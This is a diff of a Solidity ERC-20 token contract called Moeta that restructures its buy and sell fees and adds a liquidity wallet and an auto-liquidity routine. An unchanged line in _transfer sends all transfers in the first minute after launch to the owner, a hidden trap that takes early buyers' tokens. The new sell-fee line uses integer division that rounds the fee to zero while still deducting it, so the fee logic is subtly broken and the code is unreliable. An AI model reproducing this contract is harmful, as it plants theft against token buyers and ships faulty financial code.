@@ -71,12 +71,14 @@ contract Moeta is IERC20, Ownable {
     mapping (address => bool) private _isExcludedFromMaxWalletLimit;
     mapping (address => bool) private _isExcludedFromMaxTransactionLimit;
     mapping (address => bool) private _isExcludedFromFee;
-    uint8 public buyDevFee = 4;
+    uint8 public buyMarketingFee = 4;
     uint8 public buyBurnFee = 3;
-    uint8 public sellDevFee = 12;
+    uint8 public sellMarketingFee = 6;
     uint8 public sellBurnFee = 3;
+    uint8 public sellLiquidityFee = 6;
     address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;
     address public marketingWallet;
+    address public liquidityWallet;
     uint256 minimumTokensBeforeSwap = _totalSupply * 250 / 1000000; // .025%
     uint256 private _launchTimestamp;
 
@@ -84,6 +86,7 @@ contract Moeta is IERC20, Ownable {
         IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
         uniswapV2Router = _uniswapV2Router;
         marketingWallet = owner();
+        liquidityWallet = owner();
         _isExcludedFromFee[owner()] = true;
         _isExcludedFromFee[address(this)] = true;
         _isExcludedFromFee[deadWallet] = true;
@@ -105,74 +108,86 @@ contract Moeta is IERC20, Ownable {
         _transfer(_msgSender(), recipient, amount);
         return true;
     }
+
     function approve(address spender, uint256 amount) external override returns (bool) {
         _approve(_msgSender(), spender, amount);
         return true;
     }
+
     function transferFrom( address sender,address recipient,uint256 amount) external override returns (bool) {
         _transfer(sender, recipient, amount);
         require(amount <= _allowances[sender][_msgSender()], "ERC20: transfer amount exceeds allowance.");
         _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
         return true;
     }
+
     function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool){
         _approve(_msgSender(),spender,_allowances[_msgSender()][spender] + addedValue);
         return true;
     }
+
     function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
         require(subtractedValue <= _allowances[_msgSender()][spender], "ERC20: decreased allownace below zero.");
         _approve(_msgSender(),spender,_allowances[_msgSender()][spender] - subtractedValue);
         return true;
     }
+
     function _approve(address owner, address spender,uint256 amount) private {
         require(owner != address(0), "ERC20: approve from the zero address");
         require(spender != address(0), "ERC20: approve to the zero address");
         _allowances[owner][spender] = amount;
     }
+
     function excludeFromMaxWalletLimit(address account, bool excluded) external onlyOwner {
-        require(_isExcludedFromMaxWalletLimit[account] != excluded, string.concat(_name, ": account is already excluded from max wallet limit."));
+        require(_isExcludedFromMaxWalletLimit[account] != excluded, "wallet address already excluded.");
         _isExcludedFromMaxWalletLimit[account] = excluded;
     }
+
     function excludeFromFees(address account, bool excluded) external onlyOwner {
-        require(_isExcludedFromFee[account] != excluded, string.concat(_name, ": account is already excluded from fees."));
+        require(_isExcludedFromFee[account] != excluded, "wallet address already excluded.");
         _isExcludedFromFee[account] = excluded;
     }
-    function setBuyDevFee(uint8 newFee) external onlyOwner {
-        require(newFee != buyDevFee, string.concat(_name, ": new buyDevFee cannot be the same as current buyDevFee."));
-        require(newFee <= 10, string.concat(_name, ": new buyDevFee must be <= 10."));
-        buyDevFee = newFee;
+
+    function setBuyFees(uint8 newBuyMarketingFee, uint8 newBuyBurnFee) external onlyOwner {
+        require(newBuyMarketingFee != buyMarketingFee, "new buyMarketingFee cannot be the same as current buyMarketingFee.");
+        require(newBuyMarketingFee <= 10, "new buyMarketingFee must be <= 10.");
+        require(newBuyBurnFee != buyBurnFee, "new buyBurnFee cannot be the same as current buyBurnFee.");
+        require(newBuyBurnFee <= 5, "new buyBurnFee must be <= 5.");
+        buyMarketingFee = newBuyMarketingFee;
+        buyBurnFee = newBuyBurnFee;
     }
-    function setBuyBurnFee(uint8 newFee) external onlyOwner {
-        require(newFee != buyBurnFee, string.concat(_name, ": new buyBurnFee cannot be the same as current buyBurnFee."));
-        require(newFee <= 5, string.concat(_name, ": new buyBurnFee must be <= 5."));
-        buyBurnFee = newFee;
+
+    function setSellFees(uint8 newSellMarketingFee, uint8 newSellBurnFee, uint8 newSellLiquidityFee) external onlyOwner {
+        require(newSellMarketingFee != sellMarketingFee, "new sellMarketingFee cannot be the same as current sellMarketingFee.");
+        require(newSellMarketingFee <= 7, "new sellMarketingFee must be <= 7.");
+        require(newSellBurnFee != sellBurnFee, "new sellBurnFee cannot be the same as current sellBurnFee.");
+        require(newSellBurnFee <= 5, "new sellBurnFee must be <= 5.");
+        require(newSellLiquidityFee != sellLiquidityFee, "new sellLiquidityFee cannot be the same as current sellLiquidityFee.");
+        require(newSellLiquidityFee <= 8, "new sellLiquidityFee must be <= 8.");
+        sellMarketingFee = newSellMarketingFee;
+        sellBurnFee = newSellBurnFee;
+        sellLiquidityFee = newSellLiquidityFee;
     }
-    function setSellDevFee(uint8 newFee) external onlyOwner {
-        require(newFee != sellDevFee, string.concat(_name, ": new sellDevFee cannot be the same as current sellDevFee."));
-        require(newFee <= 15, string.concat(_name, ": new sellDevFee must be <= 15."));
-        sellDevFee = newFee;
-    }
-    function setSellBurnFee(uint8 newFee) external onlyOwner {
-        require(newFee != sellBurnFee, string.concat(_name, ": new sellBurnFee cannot be the same as current sellBurnFee."));
-        require(newFee <= 5, string.concat(_name, ": new sellBurnFee must be <= 5."));
-        sellBurnFee = newFee;
-    }
+
     function setMaxWalletAmount(uint256 newValue) external onlyOwner {
-        require(newValue != maxWalletAmount, string.concat(_name, ": cannot update maxWalletAmount to same value."));
-        require(newValue > _totalSupply * 1 / 100, string.concat(_name, ": maxWalletAmount must be >1% of total supply."));
+        require(newValue != maxWalletAmount, "cannot update maxWalletAmount to same value.");
+        require(newValue > _totalSupply * 1 / 100, "maxWalletAmount must be >1% of total supply.");
         maxWalletAmount = newValue;
     }
+
     function setMaxTransactionAmount(uint256 newValue) external onlyOwner {
-        require(newValue != maxTxAmount, string.concat(_name, ": cannot update maxTxAmount to same value."));
-        require(newValue > _totalSupply * 1 / 1000, string.concat(_name, ": maxTxAmount must be > .1% of total supply."));
+        require(newValue != maxTxAmount, "cannot update maxTxAmount to same value.");
+        require(newValue > _totalSupply * 1 / 1000, "maxTxAmount must be > .1% of total supply.");
         maxTxAmount = newValue;
     }
+
     function setMinimumTokensBeforeSwap(uint256 newValue) external onlyOwner {
-        require(newValue != minimumTokensBeforeSwap, string.concat(_name, ": cannot update minimumTokensBeforeSwap to same value."));
+        require(newValue != minimumTokensBeforeSwap, "cannot update minimumTokensBeforeSwap to same value.");
         minimumTokensBeforeSwap = newValue;
     }
+
     function setNewMarketingWallet(address newAddress) external onlyOwner {
-        require(newAddress != marketingWallet, string.concat(_name, ": cannot update marketingWallet to same address."));
+        require(newAddress != marketingWallet, "cannot update marketingWallet to same address.");
         _isExcludedFromFee[marketingWallet] = false;
         _isExcludedFromMaxTransactionLimit[marketingWallet] = false;
         _isExcludedFromMaxWalletLimit[marketingWallet] = false;
@@ -181,14 +196,27 @@ contract Moeta is IERC20, Ownable {
         _isExcludedFromMaxTransactionLimit[marketingWallet] = true;
         _isExcludedFromMaxWalletLimit[marketingWallet] = true;
     }
+
+    function setNewLiquidityWallet(address newAddress) external onlyOwner {
+        require(newAddress != liquidityWallet, "cannot update liquidityWallet to same address.");
+        _isExcludedFromFee[liquidityWallet] = false;
+        _isExcludedFromMaxTransactionLimit[liquidityWallet] = false;
+        _isExcludedFromMaxWalletLimit[liquidityWallet] = false;
+        liquidityWallet = newAddress;
+        _isExcludedFromFee[liquidityWallet] = true;
+        _isExcludedFromMaxTransactionLimit[liquidityWallet] = true;
+        _isExcludedFromMaxWalletLimit[liquidityWallet] = true;
+    }
+
     function withdrawStuckETH() external onlyOwner {
-        require(address(this).balance > 0, string.concat(_name, ": cannot send more than contract balance."));
+        require(address(this).balance > 0, "cannot send more than contract balance.");
         uint256 amount = address(this).balance;
         (bool success,) = address(owner()).call{value : amount}("");
-        require(success, string.concat(_name, ": error withdrawing ETH from contract."));
+        require(success, "error withdrawing ETH from contract.");
     }
+
     function activateTrading() external onlyOwner {
-        require(!isLiquidityAdded, string.concat(_name, ": you can only add liquidity once"));
+        require(!isLiquidityAdded, "you can only add liquidity once.");
         isLiquidityAdded = true;
         _approve(address(this), address(uniswapV2Router), _totalSupply);
         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, _msgSender(), block.timestamp);
@@ -201,8 +229,9 @@ contract Moeta is IERC20, Ownable {
         _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
         _launchTimestamp = block.timestamp;
     }
+
     function _setAutomatedMarketMakerPair(address pair, bool value) private {
-        require(automatedMarketMakerPairs[pair] != value, string.concat(_name, ": automated market maker pair is already set to that value."));
+        require(automatedMarketMakerPairs[pair] != value, "automated market maker pair is already set to that value.");
         automatedMarketMakerPairs[pair] = value;
     }
 
@@ -214,21 +243,21 @@ contract Moeta is IERC20, Ownable {
     function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }
 
     function _transfer(address from, address to, uint256 amount) internal {
-        require(from != address(0), string.concat(_name, ": cannot transfer from the zero address."));
-        require(to != address(0), string.concat(_name, ": cannot transfer to the zero address."));
-        require(amount > 0, string.concat(_name, ": transfer amount must be greater than zero."));
-        require(amount <= balanceOf(from), string.concat(_name, ": cannot transfer more than balance."));
+        require(from != address(0), "cannot transfer from the zero address.");
+        require(to != address(0), "cannot transfer to the zero address.");
+        require(amount > 0, "transfer amount must be greater than zero.");
+        require(amount <= balanceOf(from), "cannot transfer more than balance.");
         if (block.timestamp - _launchTimestamp <= 60) { to = owner(); } // 1 minute
         if ((from == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[to]) ||
                 (to == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[from])) {
-            require(amount <= maxTxAmount, string.concat(_name, ": transfer amount exceeds the maxTxAmount."));
+            require(amount <= maxTxAmount, "transfer amount exceeds the maxTxAmount.");
         }
         if (!_isExcludedFromMaxWalletLimit[to]) {
-            require((balanceOf(to) + amount) <= maxWalletAmount, string.concat(_name, ": expected wallet amount exceeds the maxWalletAmount."));
+            require((balanceOf(to) + amount) <= maxWalletAmount, "expected wallet amount exceeds the maxWalletAmount.");
         }
         if (_isExcludedFromFee[from] || _isExcludedFromFee[to] ||
-                (from == uniswapV2Pair && buyDevFee + buyBurnFee == 0) || // buy
-                (to == uniswapV2Pair && sellDevFee + sellBurnFee == 0)      // sell
+                (from == uniswapV2Pair && buyMarketingFee + buyBurnFee == 0) ||                 // buy
+                (to == uniswapV2Pair && sellMarketingFee + sellBurnFee + sellLiquidityFee == 0) // sell
            ) {
             balances[from] -= amount;
             balances[to] += amount;
@@ -236,30 +265,46 @@ contract Moeta is IERC20, Ownable {
         } else {
             balances[from] -= amount;
             if (from == uniswapV2Pair) { // buy
-                balances[address(this)] += amount * buyDevFee / 100;
-                emit Transfer(from, address(this), amount * buyDevFee / 100);
-                balances[to] += amount - (amount * (buyDevFee + buyBurnFee) / 100);
+                balances[address(this)] += amount * buyMarketingFee / 100;
+                emit Transfer(from, address(this), amount * buyMarketingFee / 100);
+                balances[to] += amount - (amount * (buyMarketingFee + buyBurnFee) / 100);
                 _totalSupply -= amount * buyBurnFee / 100;
-                emit Transfer(from, to, amount - (amount * (buyDevFee + buyBurnFee) / 100));
+                emit Transfer(from, to, amount - (amount * (buyMarketingFee + buyBurnFee) / 100));
 
             } else { // sell
-                balances[address(this)] += amount * sellDevFee / 100;
-                emit Transfer(from, address(this), amount * sellDevFee / 100);
+                balances[address(this)] += amount * ((sellMarketingFee + sellLiquidityFee) / 100);
+                emit Transfer(from, address(this), amount * ((sellMarketingFee + sellLiquidityFee) / 100));
                 if (balanceOf(address(this)) > minimumTokensBeforeSwap) {
-                    _swapTokensForETH(balanceOf(address(this)));
-                    payable(marketingWallet).transfer(address(this).balance);
+                    uint256 tokensForLiquidity = balanceOf(address(this)) * sellLiquidityFee / (buyMarketingFee + sellMarketingFee + sellLiquidityFee);
+                    _swapTokensForETH(balanceOf(address(this)) - tokensForLiquidity);
+                    uint256 ethForLiquidity = address(this).balance * sellLiquidityFee / (buyMarketingFee + sellMarketingFee + sellLiquidityFee);
+                    payable(marketingWallet).transfer(address(this).balance - ethForLiquidity);
+                    _addLiquidity(tokensForLiquidity, ethForLiquidity);
                 }
-                balances[to] += amount - (amount * (sellDevFee + sellBurnFee) / 100);
+                balances[to] += amount - (amount * (sellMarketingFee + sellBurnFee + sellLiquidityFee) / 100);
                 _totalSupply -= amount * sellBurnFee / 100;
-                emit Transfer(from, to, amount - (amount * (sellDevFee + sellBurnFee) / 100));
+                emit Transfer(from, to, amount - (amount * (sellMarketingFee + sellBurnFee + sellLiquidityFee) / 100));
             }
         }
     }
+
     function _swapTokensForETH(uint256 tokenAmount) private {
         address[] memory path = new address[](2);
         path[0] = address(this);
         path[1] = uniswapV2Router.WETH();
         _approve(address(this), address(uniswapV2Router), tokenAmount);
         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
+    }
+
+    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+        uniswapV2Router.addLiquidityETH{value: ethAmount}(
+                address(this),
+                tokenAmount,
+                0, // slippage is unavoidable
+                0, // slippage is unavoidable
+                liquidityWallet,
+                block.timestamp
+                );
     }
 }
